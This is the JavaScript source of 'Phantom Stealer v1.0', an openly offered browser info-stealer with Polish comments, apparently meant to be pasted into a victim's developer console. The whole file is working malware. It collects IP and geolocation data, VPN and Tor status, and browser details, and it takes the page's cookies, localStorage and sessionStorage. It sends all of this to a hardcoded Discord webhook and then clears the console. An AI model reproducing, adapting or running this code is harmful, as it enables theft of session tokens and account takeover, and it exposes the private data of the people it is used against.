// ╔═══════════════════════════════════════════════════════════════════╗
// ║            PHANTOM STEALER v1.0 — FINAL & PERFECT 2025            ║
// ╚═══════════════════════════════════════════════════════════════════╝

const WEBHOOK = "https://discord.com/api/webhooks/1442990998383890524/QSjLSbjxnJuIMgHKeSZXPeU3ScKsKN6bnFMdJ6GjMNrLjEApL2NnBAfq4T_mmznLUpGq";

(async () => {
  let ip = "brak", geo = {}, vpn = {};

  try { ip = await (await fetch("https://api.ipify.org")).text(); } catch {}
  try { geo = await (await fetch("https://ipwhois.app/json/" + ip)).json(); } catch {}
  try { vpn = await (await fetch("https://vpnapi.io/api/" + ip)).json(); } catch {}

  const battery = navigator.getBattery ? await navigator.getBattery().then(b => `${Math.round(b.level*100)}% ${b.charging?"(ładowanie)":""}`) : "nie wykryto";
  const incognito = (()=>{try{localStorage.length;return"Nie"}catch{return"Tak"}})();
  const adblock = await new Promise(res => {
    const img = new Image();
    img.src = "https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?" + Date.now();
    img.onload = () => res("nie");
    img.onerror = () => res("tak");
    setTimeout(() => res("tak"), 2500);
  });

  // Funkcja bezpiecznego obcinania (Discord limit ~5800 znaków na cały embed)
  const cut = (str, max = 950) => String(str||"").length > max ? String(str).slice(0,max-3)+"..." : str;

  const payload = {
    username: "Phantom Stealer",
    avatar_url: "https://cdn.discordapp.com/attachments/1442989796279713792/1443243205322608811/Untitled1221_20251126150916.png",
    content: "",
    embeds: [{
      author: { name: "Phantom v1.0", icon_url: "https://cdn.discordapp.com/attachments/1442989796279713792/1443243205322608811/Untitled1221_20251126150916.png" },
      title: "**Phantom**: __Someone used__ „Phantom JavaScript”",
      description: "Someone used Phantom.\n> **Method**: Javascript ( Browser Developer Console )",
      color: 0x878787,
      timestamp: new Date().toISOString(),
      footer: { text: "Phantom v1.0 Ezz", icon_url: "https://cdn.discordapp.com/attachments/1442989796279713792/1443243205322608811/Untitled1221_20251126150916.png" },
      fields: [
        { name: "**IP Info**:", value: cut(
          ">>> **IP** ( v4 ): `"+ip+"`\n"+
          "**IP** ( v6 ): `"+(geo.ipv6||"brak")+"`\n"+
          "**ISP**: `"+(geo.connection?.isp || geo.isp || "brak")+"`\n"+
          "**ASN**: `"+(geo.connection?.asn || geo.asn || "brak")+"`\n"+
          "**Organizacja**: `"+(geo.connection?.org || geo.org || "brak")+"`"
        ), inline: false },

        { name: "**Geolocation Info**:", value: cut(
          ">>> **Country**: :flag_"+(geo.country_code?.toLowerCase()||"xx")+": "+(geo.country||"brak")+"\n"+
          "**Region**: `"+(geo.region||"brak")+"`\n"+
          "**City**: `"+(geo.city||"brak")+"`\n"+
          "**Zip Code**: `"+(geo.postal||"brak")+"`\n"+
          "**Coordinates**: `"+(geo.latitude||"?")+", "+(geo.longitude||"?")+"`\n"+
          "**Timezone**: `"+(geo.timezone?.name || geo.timezone?.id || geo.timezone || "brak")+"`"
        ), inline: false },

        { name: "**Anonymous Info**:", value: cut(
          ">>> **VPN**: "+(vpn.security?.vpn ? "Tak" : "Nie")+"\n"+
          "**VPN ( Server )**: `"+(vpn.security?.vpn ? vpn.location?.city || "nieznany" : "brak")+"`\n"+
          "**Tor**: "+(vpn.security?.tor ? "Tak" : "Nie")+"\n"+
          "**Proxy**: "+(vpn.security?.proxy ? "Tak" : "Nie")+"\n"+
          "**Proxy ( Server )**: `"+(vpn.security?.proxy_type || "brak")+"`\n"+
          "**Hosting**: "+(vpn.security?.hosting ? "Tak" : "Nie")+"\n"+
          "**Mobile**: "+(/Mobi|Android|iPhone/i.test(navigator.userAgent)?"Tak":"Nie")+"\n"+
          "**Bot**: "+((!navigator.webdriver && navigator.plugins?.length===0)?"Tak":"Nie")
        ), inline: false },

        { name: "**Browser Info**:", value: cut(
          ">>> **Website**: "+location.href+"\n"+
          "**User-Agent**:\n      `"+navigator.userAgent+"`\n"+
          "**Platform**: `"+navigator.platform+"`\n"+
          "**Rozdzielczość**: `"+screen.width+"x"+screen.height+"`\n"+
          "**Language**: `"+navigator.language+"`\n"+
          "**Battery**: `"+battery+"`\n"+
          "**Incognito**: "+incognito+"\n"+
          "**AdBlock**: `"+adblock+"`"
        ), inline: false },

        { name: "**Phantom Info**:", value: cut(
          ">>> **Cookies**:\n      `"+(document.cookie||"brak")+"`\n"+
          "**LocalStorage**:\n      ```json\n"+JSON.stringify(localStorage,null,2).slice(0,1000)+(Object.keys(localStorage).length>20?"\n...":"")+"```\n"+
          "**SessionStorage**:\n      ```json\n"+JSON.stringify(sessionStorage,null,2).slice(0,1000)+"```"
        ), inline: false }
      ]
    }]
  };

  // Wysyłka + automatyczne chunkowanie jeśli nadal za duże
  const send = async (pl) => {
    const resp = await fetch(WEBHOOK, {method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(pl)});
    if (resp.ok) return true;
    console.log("Discord error:", resp.status, await resp.text());
    return false;
  };

  if (JSON.stringify(payload).length > 5800) {
    // Jeśli nadal za duże – rozbijamy na 2 embedy
    const p1 = {...payload, embeds: [{...payload.embeds[0], fields: payload.embeds[0].fields.slice(0,3)}]};
    const p2 = {content: "@everyone (ciąg dalszy)", embeds: [{...payload.embeds[0], fields: payload.embeds[0].fields.slice(3)}]};
    await send(p1); await send(p2);
  } else {
    await send(payload);
  }

  console.clear();
  console.log("%cPhantom v1.0 → wysłano (pełny embed 2025)", "color:#00ff00;font-size:18px;font-weight:bold");
})();
